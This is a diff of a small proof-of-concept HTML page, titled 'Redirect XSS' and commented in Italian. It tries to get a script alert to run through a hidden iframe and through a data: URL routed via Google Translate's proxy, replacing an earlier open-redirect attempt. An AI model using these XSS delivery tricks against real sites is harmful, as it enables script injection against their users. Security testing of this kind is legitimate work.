@@ -5,10 +5,39 @@
     <title>Redirect XSS</title>
 </head>
 <body>
+    <iframe id="xssFrame" src="about:blank" style="display:none;"></iframe>
     <script>
-        // Redirect to a URL with a payload XSS
-        window.location.href = "https://example.com/redirect?url=" + encodeURIComponent("data:text/html,<script>alert('XSS');</script>");
+        // Funzione per impostare il contenuto dell'iframe
+        function setIframeContent() {
+            var iframe = document.getElementById('xssFrame');
+            var doc = iframe.contentWindow.document;
+            doc.open();
+            doc.write(`
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <title>XSS</title>
+                </head>
+                <body>
+                    <script>alert('XSS');</script>
+                </body>
+                </html>
+            `);
+            doc.close();
+        }
+
+        // Reindirizza l'iframe a Google Translate con il payload XSS
+        function redirectIframe() {
+            var iframe = document.getElementById('xssFrame');
+            iframe.src = "https://translate.google.com/translate?sl=auto&tl=en&u=" + encodeURIComponent("data:text/html," + encodeURIComponent('<script>alert(\'XSS\');</script>'));
+        }
+
+        // Esegui le funzioni in sequenza
+        setIframeContent();
+        setTimeout(redirectIframe, 1000);  // Attendi un secondo prima di reindirizzare
     </script>
 </body>
 </html>
+
 
